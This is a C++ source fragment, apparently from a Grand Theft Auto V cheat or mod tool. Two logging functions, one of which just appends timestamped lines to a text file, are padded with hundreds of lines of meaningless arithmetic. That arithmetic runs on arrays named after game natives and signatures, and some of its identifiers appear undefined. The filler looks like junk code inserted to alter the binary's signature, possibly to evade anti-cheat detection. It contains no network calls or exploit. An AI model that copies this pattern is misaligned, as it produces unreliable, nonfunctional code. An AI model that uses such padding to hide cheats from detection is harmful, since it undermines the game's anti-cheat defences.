			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ofstream Arquivo;
			Arquivo.open(arquivoTXT, std::ios_base::app);
			std::string a = HoraAtual() + "ERRO: " + texto;
			Arquivo << a << endl;
			Arquivo.close();
		}
		void Log(string texto)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
